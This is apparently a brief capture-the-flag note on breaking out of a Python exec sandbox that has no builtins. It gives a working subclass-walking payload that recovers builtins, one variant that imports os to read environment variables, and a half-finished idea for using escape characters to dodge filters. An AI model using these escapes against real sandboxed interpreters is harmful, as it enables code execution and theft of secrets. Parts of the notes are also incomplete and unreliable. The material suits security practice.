## Escapes exec without builtins

this works:
```
exec('bs = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]()._module.__builtins__; bs["print"]("1")', {'__builtins__': None}, {})
```

or in style of this challenge:
```
ingredient = a
measurements = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]()._module.__builtins__.__import__("os").environ
```

__now we need to escape [, (, . etc..__

unicode?
```
table = {
  '[': \x5B,
  '(': \x28,
  '.': \x2E,
  '_': \x5F,
}
```

new string:

```
exec('bs = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]()._module.__builtins__; bs["print"]("1")', {'__builtins__': None}, {})
```
